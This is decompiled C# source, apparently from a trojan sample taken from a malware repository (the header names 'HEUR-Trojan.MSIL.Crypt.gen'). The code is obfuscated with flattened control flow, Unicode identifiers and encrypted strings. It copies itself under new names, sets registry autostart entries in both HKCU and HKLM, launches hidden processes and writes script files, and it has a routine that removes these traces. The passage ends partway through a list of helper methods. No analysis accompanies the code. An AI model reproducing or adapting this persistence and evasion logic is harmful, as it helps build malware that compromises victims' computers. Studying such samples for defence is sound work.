// Decompiled with JetBrains decompiler
// Type: @Ԟ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

internal static class \u0040Ԟ
{
  internal static object \u0040ӓ;
  internal static readonly List<string> \u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static bool \u0040ӕ(int _param0, object _param1)
  {
    int num1 = 12;
    bool flag1;
    int num2;
    int num3;
    int num4;
    bool flag2;
    int num5;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (num4 == 1)
          {
            try
            {
              if (\u0040ԝ.\u0040ۤ((string) \u0040Ԟ.\u0040Ӛ((object) new string[7]
              {
                (string) \u0040Ԟ.\u0040Ә(589440),
                (string) \u0040Ԟ.\u0040ә(_param1),
                (string) \u0040Ԟ.\u0040Ә(589806),
                \u0040ԝ.\u0040ݿ(15, new \u0040ԣ(), 5).ToString(),
                (string) \u0040Ԟ.\u0040Ә(589844),
                (string) _param1,
                (string) \u0040Ԟ.\u0040Ә(589862)
              })) == 0)
              {
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                  try
                  {
                    \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                }
                goto case 3;
              }
              else
                goto case 3;
            }
            catch
            {
              try
              {
                RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                try
                {
                  \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                  goto case 3;
                }
                finally
                {
                  if (registryKey != null)
                    \u0040Ԟ.\u0040ӟ((object) registryKey);
                }
              }
              catch
              {
                flag2 = false;
                goto label_101;
              }
            }
          }
          else
          {
            if (true)
            {
              num1 = 8;
              continue;
            }
            goto label_101;
          }
        case 1:
          flag2 = true;
          num1 = 13;
          continue;
        case 2:
        case 5:
          if (num3 == 2)
          {
            try
            {
              \u0040ԝ.\u0040ۤ((string) \u0040Ԟ.\u0040Ӛ((object) new string[5]
              {
                (string) \u0040Ԟ.\u0040Ә(589440),
                (string) \u0040Ԟ.\u0040ә(_param1),
                (string) \u0040Ԟ.\u0040Ә(589496),
                (string) _param1,
                (string) \u0040Ԟ.\u0040Ә(589540)
              }));
            }
            catch
            {
            }
            try
            {
              RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589672), true);
              try
              {
                string str = (string) \u0040Ԟ.\u0040Ӡ((object) registryKey, \u0040Ԟ.\u0040Ә(589782));
                int num6;
                if (\u0040Ԟ.\u0040Ӣ())
                  num6 = 2;
                else
                  goto label_67;
label_66:
                switch (num6)
                {
                  case 0:
                  case 2:
                    \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040Ә(589782), \u0040Ԟ.\u0040ӡ((object) str, \u0040Ԟ.\u0040Ә(589796), _param1, \u0040Ԟ.\u0040Ә(1878)));
                    goto label_72;
                  default:
                    goto label_72;
                }
label_67:
                num6 = 3;
                if (true)
                  goto label_66;
              }
              finally
              {
                if (registryKey != null)
                  \u0040Ԟ.\u0040ӟ((object) registryKey);
              }
            }
            catch
            {
            }
label_72:
            try
            {
              RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
              try
              {
                \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
              }
              finally
              {
                if (registryKey != null)
                  \u0040Ԟ.\u0040ӟ((object) registryKey);
              }
            }
            catch
            {
            }
            try
            {
              RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
              try
              {
                \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                goto case 1;
              }
              finally
              {
                if (registryKey != null)
                  \u0040Ԟ.\u0040ӟ((object) registryKey);
              }
            }
            catch
            {
              goto case 1;
            }
          }
          else
            goto case 1;
        case 3:
          goto case 1;
        case 4:
          if (!flag1)
          {
            num5 = _param0;
            goto case 7;
          }
          else
          {
            if (\u0040Ԟ.\u0040Ӣ())
            {
              num1 = 6;
              continue;
            }
            goto case 11;
          }
        case 6:
          num2 = _param0;
          if (\u0040Ԟ.\u0040Ӣ())
          {
            num1 = 10;
            continue;
          }
          goto case 0;
        case 7:
        case 9:
          num4 = num5;
          num1 = 0;
          continue;
        case 8:
          if (num4 != 2)
          {
            num1 = 3;
            continue;
          }
          try
          {
            \u0040ԝ.\u0040ۤ((string) \u0040Ԟ.\u0040Ӛ((object) new string[7]
            {
              (string) \u0040Ԟ.\u0040Ә(589440),
              (string) \u0040Ԟ.\u0040ә(_param1),
              (string) \u0040Ԟ.\u0040Ә(589806),
              \u0040ԝ.\u0040ݿ(15, new \u0040ԣ(), 5).ToString(),
              (string) \u0040Ԟ.\u0040Ә(589844),
              (string) _param1,
              (string) \u0040Ԟ.\u0040Ә(589862)
            }));
          }
          catch
          {
          }
          try
          {
            RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
            try
            {
              \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
              goto case 3;
            }
            finally
            {
              if (registryKey != null)
                \u0040Ԟ.\u0040ӟ((object) registryKey);
            }
          }
          catch
          {
            goto case 3;
          }
        case 10:
          num3 = num2;
          num1 = 11;
          continue;
        case 11:
          if (num3 == 1)
          {
            try
            {
              if (\u0040ԝ.\u0040ۤ((string) \u0040Ԟ.\u0040Ӛ((object) new string[5]
              {
                (string) \u0040Ԟ.\u0040Ә(589440),
                (string) \u0040Ԟ.\u0040ә(_param1),
                (string) \u0040Ԟ.\u0040Ә(589496),
                (string) _param1,
                (string) \u0040Ԟ.\u0040Ә(589540)
              })) == 0)
              {
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                  try
                  {
                    \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                  try
                  {
                    RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                    try
                    {
                      \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                    }
                    finally
                    {
                      if (registryKey != null)
                        \u0040Ԟ.\u0040ӟ((object) registryKey);
                    }
                  }
                  catch
                  {
                  }
                }
                goto case 1;
              }
              else
                goto case 1;
            }
            catch
            {
              try
              {
                RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                try
                {
                  \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                  goto case 1;
                }
                finally
                {
                  if (registryKey != null)
                    \u0040Ԟ.\u0040ӟ((object) registryKey);
                }
              }
              catch
              {
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                  try
                  {
                    \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040ә(_param1), \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(1878), _param1, \u0040Ԟ.\u0040Ә(1878)));
                    goto case 1;
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                  flag2 = false;
                  goto label_101;
                }
              }
            }
          }
          else
          {
            if (!\u0040Ԟ.\u0040Ӣ())
            {
              int num7 = 9;
              num1 = \u0040Ԟ.\u0040ӣ() ? num7 : num7;
              continue;
            }
            num1 = 2;
            continue;
          }
        case 12:
          flag1 = \u0040ԝ.\u0040؜();
          num1 = 4;
          continue;
        case 13:
          goto label_101;
        default:
          num1 = 1;
          continue;
      }
    }
label_101:
    return flag2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040Ӗ(int _param0)
  {
    int num1 = 4;
    while (true)
    {
      \u0040ԣ ԣ;
      List<string> stringList;
      bool flag1;
      int num2;
      bool flag2;
      int num3;
      int num4;
      switch (num1)
      {
        case 0:
          num3 = _param0 == 2 ? 1 : 0;
          break;
        case 1:
        case 6:
          num4 = \u0040Ԟ.\u0040ӧ(\u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ӥ(\u0040ԑ.\u0040ӓ), \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040Ӧ((object) \u0040ԝ.\u0040\u0590((string) \u0040Ԟ.\u0040ӥ(\u0040ԑ.\u0040ӓ)), 0, 14))) ? 1 : 0;
          goto label_95;
        case 2:
          do
          {
            try
            {
              \u0040ԝ.\u0040ݢ((string) \u0040Ԟ.\u0040Ә(589888), (string) \u0040Ԟ.\u0040ӵ((object) stringList));
            }
            catch
            {
            }
            \u0040ԝ.\u0040\u05CC();
          }
          while (\u0040Ԟ.\u0040ӣ());
          num1 = 8;
          continue;
        case 3:
label_83:
          stringList.Add((string) \u0040ԑ.\u0040ӓ);
          num1 = 10;
          continue;
        case 4:
          if (_param0 != 0)
          {
            if (!\u0040Ԟ.\u0040ӣ())
            {
              num1 = 6;
              continue;
            }
            if (\u0040Ԟ.\u0040Ӣ())
            {
              num1 = 9;
              continue;
            }
            goto label_86;
          }
          else
          {
            num4 = 1;
            goto label_95;
          }
        case 5:
        case 15:
          flag2 = num2 < \u0040ԝ.\u0040ݿ(15, ԣ, 3);
          goto case 9;
        case 7:
          ԣ = new \u0040ԣ();
          num1 = 3;
          continue;
        case 8:
          try
          {
            foreach (object[] objArray in \u0040Ԓ.\u0040ӕ)
            {
              try
              {
                MethodInfo methodInfo = (MethodInfo) objArray[0];
                switch (\u0040Ԟ.\u0040ӣ() ? 3 : 2)
                {
                  case 0:
                  case 2:
                    \u0040Ԟ.\u0040Ӷ((object) methodInfo, objArray[1], (object) new object[3]
                    {
                      \u0040ԑ.\u0040ӓ,
                      (object) _param0,
                      (object) stringList
                    });
                    break;
                }
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
          try
          {
            bool flag3 = \u0040Ԟ.\u0040ӷ((object) stringList) > 0;
            int num5 = 13;
            string str1;
            ProcessStartInfo processStartInfo1;
            bool flag4;
            string str2;
            string str3;
            bool flag5;
            while (true)
            {
              switch (num5)
              {
                case 0:
                  str3 = (string) \u0040Ԟ.\u0040Ӛ((object) new string[5]
                  {
                    (string) \u0040Ԟ.\u0040Ә(4352),
                    str2,
                    (string) \u0040Ԟ.\u0040Ә(1840),
                    str1,
                    (string) \u0040Ԟ.\u0040Ә(1878)
                  });
                  num5 = 7;
                  continue;
                case 1:
                  flag4 = \u0040ԝ.\u0040ݿ(100, ԣ, 0) > 50;
                  goto case 9;
                case 2:
                case 3:
                case 11:
                  flag5 = !\u0040Ԟ.\u0040ӧ((object) str2);
                  goto case 4;
                case 4:
                case 14:
                  if (flag5)
                  {
                    str2 = stringList[\u0040ԝ.\u0040ݿ(\u0040Ԟ.\u0040ӷ((object) stringList) - 1, ԣ, 0)];
                    \u0040Ԟ.\u0040Ӣ();
                    num5 = \u0040Ԟ.\u0040ӣ() ? 14 : 11;
                    continue;
                  }
                  if (\u0040Ԟ.\u0040Ӣ())
                  {
                    num5 = 12;
                    continue;
                  }
                  goto case 1;
                case 5:
                  \u0040Ԟ.\u0040ӽ((object) processStartInfo1);
                  num5 = 6;
                  continue;
                case 6:
                  \u0040Ԟ.\u0040Ӿ(0);
                  if (true)
                  {
                    num5 = 16;
                    continue;
                  }
                  goto case 7;
                case 7:
                  \u0040Ԟ.\u0040Ӹ((object) str1, (object) str3, (object) new UTF8Encoding(false));
                  num5 = 10;
                  continue;
                case 8:
                  str2 = stringList[\u0040ԝ.\u0040ݿ(\u0040Ԟ.\u0040ӷ((object) stringList) - 1, ԣ, 0)];
                  if (true)
                  {
                    num5 = 2;
                    continue;
                  }
                  goto case 6;
                case 9:
                  if (flag4)
                  {
                    num5 = 15;
                    continue;
                  }
                  goto case 10;
                case 10:
                  ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
                  \u0040Ԟ.\u0040ӹ((object) processStartInfo2, ProcessWindowStyle.Hidden);
                  \u0040Ԟ.\u0040Ӻ((object) processStartInfo2, \u0040ԝ.\u0040؜() ? \u0040Ԟ.\u0040Ә(1884) : (object) "");
                  \u0040Ԟ.\u0040ӻ((object) processStartInfo2, true);
                  \u0040Ԟ.\u0040Ӽ((object) processStartInfo2, (object) str1);
                  processStartInfo1 = processStartInfo2;
                  num5 = 5;
                  continue;
                case 12:
                  str1 = str2;
                  num5 = 1;
                  continue;
                case 13:
                  if (flag3)
                  {
                    num5 = 8;
                    continue;
                  }
                  goto label_36;
                case 15:
                  str1 = (string) \u0040Ԟ.\u0040ӡ((object) \u0040ԝ.\u0040Ծ(), \u0040Ԟ.\u0040Ә(1604), (object) \u0040ԝ.\u0040\u05CB(10), \u0040Ԟ.\u0040Ә(1610));
                  num5 = 0;
                  continue;
                case 16:
                  goto label_36;
                default:
                  num5 = 9;
                  continue;
              }
            }
          }
          catch
          {
          }
label_36:
          \u0040Ԟ.\u0040ӓ = (object) null;
          num1 = 18;
          continue;
        case 9:
        case 11:
          if (flag2)
          {
            try
            {
              if (\u0040ԝ.\u0040ݿ(100, ԣ, 1) >= 50)
              {
                string str4 = (string) \u0040Ԟ.\u0040ө((object) \u0040ԝ.\u0040\u05C8());
                string str5 = \u0040ԝ.\u0040ܢ((string) \u0040Ԟ.\u0040ӫ(\u0040Ԟ.\u0040Ӫ()));
                \u0040Ԟ.\u0040Ӭ(\u0040ԑ.\u0040ӓ, \u0040Ԟ.\u0040ӡ((object) str5, \u0040Ԟ.\u0040Ә(1604), (object) str4, \u0040Ԟ.\u0040Ә(1412)), true);
                \u0040Ԟ.\u0040Ӯ(\u0040Ԟ.\u0040ӝ((object) str5, \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040Ӧ((object) \u0040ԝ.\u0040\u0590((string) \u0040Ԟ.\u0040ӭ((object) str4, \u0040Ԟ.\u0040Ә(1412))), 0, 14)), (object) \u0040ԝ.\u0040\u05CB(\u0040ԝ.\u0040ݿ(1000, new \u0040ԣ(), 10)));
                stringList.Add((string) \u0040Ԟ.\u0040ӡ((object) str5, \u0040Ԟ.\u0040Ә(1604), (object) str4, \u0040Ԟ.\u0040Ә(1412)));
                \u0040Ԟ.\u0040ӯ(_param0, \u0040Ԟ.\u0040ӡ((object) str5, \u0040Ԟ.\u0040Ә(1604), (object) str4, \u0040Ԟ.\u0040Ә(1412)));
              }
              else
              {
                Process process = \u0040ԝ.\u0040\u05C8();
                string str6 = string.Empty;
                while (\u0040Ԟ.\u0040Ӱ((object) str6) < 3)
                {
                  process = \u0040ԝ.\u0040\u05C8();
                  try
                  {
                    str6 = \u0040ԝ.\u0040ս(1024, process);
                  }
                  catch
                  {
                  }
                }
                string str7 = (string) \u0040Ԟ.\u0040Ӥ((object) str6);
                string str8 = (string) \u0040Ԟ.\u0040ө((object) process);
                string[] strArray = (string[]) \u0040Ԟ.\u0040ӱ((object) str7);
                if (strArray.Length > 1)
                {
                  str7 = (string) \u0040Ԟ.\u0040ӝ((object) str7, \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040ә((object) strArray[\u0040ԝ.\u0040ӝ(new \u0040ԣ(), strArray.Length)]));
                  if (!\u0040Ԟ.\u0040Ӳ((object) str7))
                    \u0040Ԟ.\u0040ӳ((object) str7);
                }
                \u0040Ԟ.\u0040Ӭ(\u0040ԑ.\u0040ӓ, \u0040Ԟ.\u0040ӡ((object) str7, \u0040Ԟ.\u0040Ә(1604), (object) str8, \u0040Ԟ.\u0040Ә(1412)), true);
                \u0040Ԟ.\u0040Ӯ(\u0040Ԟ.\u0040ӝ((object) str7, \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040Ӧ((object) \u0040ԝ.\u0040\u0590((string) \u0040Ԟ.\u0040ӭ((object) str8, \u0040Ԟ.\u0040Ә(1412))), 0, 14)), (object) \u0040ԝ.\u0040\u05CB(\u0040ԝ.\u0040ݿ(1000, new \u0040ԣ(), 10)));
                stringList.Add((string) \u0040Ԟ.\u0040ӡ((object) str7, \u0040Ԟ.\u0040Ә(1604), (object) str8, \u0040Ԟ.\u0040Ә(1412)));
                \u0040Ԟ.\u0040ӯ(_param0, \u0040Ԟ.\u0040ӡ((object) str7, \u0040Ԟ.\u0040Ә(1604), (object) str8, \u0040Ԟ.\u0040Ә(1412)));
              }
            }
            catch
            {
              --num2;
            }
            ++num2;
            num1 = 5;
            continue;
          }
          num1 = 2;
          continue;
        case 10:
          if (_param0 != 1)
          {
            num1 = 0;
            continue;
          }
          num3 = 1;
          break;
        case 12:
          stringList = new List<string>();
          num1 = 7;
          continue;
        case 13:
          num2 = 0;
          goto case 5;
        case 14:
          try
          {
            string str9 = (string) \u0040Ԟ.\u0040ө((object) \u0040ԝ.\u0040\u05C8());
            int num6 = 6;
            while (true)
            {
              string str10;
              switch (num6)
              {
                case 0:
                case 3:
                  \u0040Ԟ.\u0040Ӯ(\u0040Ԟ.\u0040ӝ((object) str10, \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040Ӧ((object) \u0040ԝ.\u0040\u0590((string) \u0040Ԟ.\u0040ӭ((object) str9, \u0040Ԟ.\u0040Ә(1412))), 0, 14)), (object) \u0040ԝ.\u0040\u05CB(\u0040ԝ.\u0040ݿ(1000, new \u0040ԣ(), 10)));
                  goto case 2;
                case 1:
                  \u0040Ԟ.\u0040ӯ(2, \u0040Ԟ.\u0040ӡ((object) str10, \u0040Ԟ.\u0040Ә(1604), (object) str9, \u0040Ԟ.\u0040Ә(1412)));
                  num6 = 8;
                  continue;
                case 2:
                case 4:
                  stringList.Add((string) \u0040Ԟ.\u0040ӡ((object) str10, \u0040Ԟ.\u0040Ә(1604), (object) str9, \u0040Ԟ.\u0040Ә(1412)));
                  num6 = 1;
                  continue;
                case 5:
                  str10 = (string) \u0040Ԟ.\u0040Ӵ(\u0040Ԟ.\u0040Ӵ((object) str10, \u0040Ԟ.\u0040Ә(576410), (object) \u0040ԝ.\u0040ب()), \u0040Ԟ.\u0040Ә(576434), \u0040Ԟ.\u0040Ӵ(\u0040Ԟ.\u0040ӫ(\u0040Ԟ.\u0040Ӫ()), \u0040Ԟ.\u0040Ә(1604), (object) ""));
                  num6 = 7;
                  continue;
                case 6:
                  str10 = (string) new string((char[]) \u0040ԑ.\u0040Ӕ).\u0040ӗ<Dictionary<string, object>>()[(string) \u0040Ԟ.\u0040Ә(589876)];
                  num6 = 5;
                  continue;
                case 7:
                  \u0040Ԟ.\u0040Ӭ(\u0040ԑ.\u0040ӓ, \u0040Ԟ.\u0040ӡ((object) str10, \u0040Ԟ.\u0040Ә(1604), (object) str9, \u0040Ԟ.\u0040Ә(1412)), true);
                  break;
                case 8:
                  goto label_47;
              }
              num6 = \u0040Ԟ.\u0040ӣ() ? 2 : 0;
            }
          }
          catch
          {
          }
label_47:
          goto case 2;
        case 16:
          goto label_87;
        case 17:
          if (flag1)
          {
            if (true)
            {
              num1 = 14;
              continue;
            }
            goto case 0;
          }
          else
            goto case 2;
        case 18:
          goto label_72;
        default:
          num1 = 15;
          continue;
      }
      if (num3 == 0)
      {
        flag1 = _param0 == 3;
        num1 = 17;
        continue;
      }
      if (!\u0040Ԟ.\u0040ӣ())
      {
        num1 = 13;
        continue;
      }
      goto label_83;
label_95:
      if (num4 == 0)
      {
        \u0040Ԟ.\u0040ӓ = \u0040Ԟ.\u0040Ө();
        num1 = 12;
      }
      else
        num1 = 16;
    }
label_86:
    return;
label_72:
    return;
label_87:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040ӗ(\u0040Ԫ _param0)
  {
    int num1 = 10;
    bool flag;
    List<string> stringList;
    List<string>.Enumerator enumerator;
    string str1;
    string str2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (flag)
          {
            num1 = 6;
            continue;
          }
          goto label_57;
        case 1:
          \u0040ԝ.\u0040ں(str2, str1, _param0);
          num1 = 11;
          continue;
        case 2:
        case 8:
          enumerator = stringList.GetEnumerator();
          num1 = 9;
          continue;
        case 3:
          str2 = "";
          num1 = 1;
          continue;
        case 4:
        case 5:
          flag = \u0040Ԟ.\u0040ӷ((object) stringList) > 0;
          goto case 0;
        case 6:
          str1 = (string) \u0040Ԟ.\u0040Ә(589888);
          num1 = 3;
          continue;
        case 7:
          stringList.Add((string) \u0040ԑ.\u0040ӓ);
          \u0040Ԟ.\u0040Ӣ();
          if (\u0040Ԟ.\u0040ӣ())
          {
            if (\u0040Ԟ.\u0040Ӣ())
            {
              num1 = 5;
              continue;
            }
            goto case 1;
          }
          else
          {
            num1 = 8;
            continue;
          }
        case 9:
          try
          {
            while (enumerator.MoveNext())
            {
              string current = enumerator.Current;
              if (\u0040Ԟ.\u0040ӧ((object) current))
              {
                try
                {
                  ProcessStartInfo processStartInfo = new ProcessStartInfo((string) \u0040Ԟ.\u0040Ә(589904));
                  \u0040Ԟ.\u0040ӿ((object) processStartInfo, \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(589924), \u0040Ԟ.\u0040ә((object) current), \u0040Ԟ.\u0040Ә(589954)));
                  \u0040Ԟ.\u0040ӻ((object) processStartInfo, false);
                  \u0040Ԟ.\u0040Ԁ((object) processStartInfo, true);
                  \u0040Ԟ.\u0040ԁ(\u0040Ԟ.\u0040ӽ((object) processStartInfo));
                }
                catch
                {
                }
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                  try
                  {
                    \u0040Ԟ.\u0040Ԃ((object) registryKey, \u0040Ԟ.\u0040ә((object) current));
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                }
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.LocalMachine, RegistryView.Default), \u0040Ԟ.\u0040Ә(589672), true);
                  try
                  {
                    string str3 = (string) \u0040Ԟ.\u0040Ӡ((object) registryKey, \u0040Ԟ.\u0040Ә(589782));
                    \u0040Ԟ.\u0040ӣ();
                    switch (!\u0040Ԟ.\u0040Ӣ() ? 3 : 2)
                    {
                      case 0:
                      case 2:
                        \u0040Ԟ.\u0040Ӟ((object) registryKey, \u0040Ԟ.\u0040Ә(589782), \u0040Ԟ.\u0040Ӵ((object) str3, \u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ә(589796), (object) current, \u0040Ԟ.\u0040Ә(1878)), (object) ""));
                        break;
                    }
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                }
                try
                {
                  RegistryKey registryKey = (RegistryKey) \u0040Ԟ.\u0040Ӝ(\u0040Ԟ.\u0040ӛ(RegistryHive.CurrentUser, RegistryView.Default), \u0040Ԟ.\u0040Ә(589578), true);
                  try
                  {
                    \u0040Ԟ.\u0040Ԃ((object) registryKey, \u0040Ԟ.\u0040ә((object) current));
                  }
                  finally
                  {
                    if (registryKey != null)
                      \u0040Ԟ.\u0040ӟ((object) registryKey);
                  }
                }
                catch
                {
                }
                try
                {
                  \u0040Ԟ.\u0040ԃ((object) current);
                  int num2;
                  if (\u0040Ԟ.\u0040Ӣ())
                  {
                    if (true)
                    {
                      num2 = 2;
                      goto label_39;
                    }
                  }
                  else
                    goto label_40;
label_38:
                  \u0040Ԟ.\u0040ԃ(\u0040Ԟ.\u0040ӝ(\u0040Ԟ.\u0040Ӥ((object) current), \u0040Ԟ.\u0040Ә(1604), \u0040Ԟ.\u0040Ӧ((object) \u0040ԝ.\u0040\u0590((string) \u0040Ԟ.\u0040ӥ((object) current)), 0, 14)));
                  goto label_42;
label_39:
                  switch (num2)
                  {
                    case 0:
                    case 2:
                      goto label_38;
                    default:
                      goto label_42;
                  }
label_40:
                  num2 = 3;
                  goto label_39;
                }
                catch
                {
                }
label_42:;
              }
            }
          }
          finally
          {
            enumerator.Dispose();
          }
          \u0040ԝ.\u0040ֆ();
          goto case 4;
        case 10:
          try
          {
            foreach (object[] objArray in \u0040Ԓ.\u0040Ӕ)
            {
              try
              {
                MethodInfo methodInfo = (MethodInfo) objArray[0];
                \u0040Ԟ.\u0040Ӣ();
                switch (\u0040Ԟ.\u0040ӣ() ? 3 : 2)
                {
                  case 0:
                  case 2:
                    \u0040Ԟ.\u0040Ӷ((object) methodInfo, objArray[1], (object) new object[1]
                    {
                      \u0040ԑ.\u0040ӓ
                    });
                    break;
                }
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
          stringList = \u0040ԝ.\u0040ޑ((string) \u0040Ԟ.\u0040Ә(589888), _param0).\u0040ӗ<List<string>>();
          num1 = 7;
          continue;
        case 11:
          goto label_63;
        default:
          num1 = 0;
          continue;
      }
    }
label_57:
    return;
label_63:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0040Ԟ()
  {
    \u0040Ԟ.\u0040Ӣ();
    int num = \u0040Ԟ.\u0040ӣ() ? 2 : 4;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 4:
          \u0040Ԟ.\u0040Ԅ();
          goto case 1;
        case 1:
        case 2:
          \u0040Ԟ.\u0040ӓ = (object) null;
          goto case 3;
        case 3:
          \u0040Ԟ.\u0040Ӕ = new List<string>()
          {
            (string) \u0040Ԟ.\u0040Ә(589966)
          };
          if (true)
          {
            num = 5;
            continue;
          }
          goto case 1;
        case 5:
          goto label_2;
        default:
          if (\u0040Ԟ.\u0040Ӣ())
          {
            num = 3;
            continue;
          }
          goto label_7;
      }
    }
label_2:
    return;
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) Path.GetFileNameWithoutExtension((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) string.Concat((string[]) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(RegistryHive _param0, RegistryView _param1) => (object) RegistryKey.OpenBaseKey(_param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0, object _param1, bool _param2) => (object) ((RegistryKey) _param0).OpenSubKey((string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
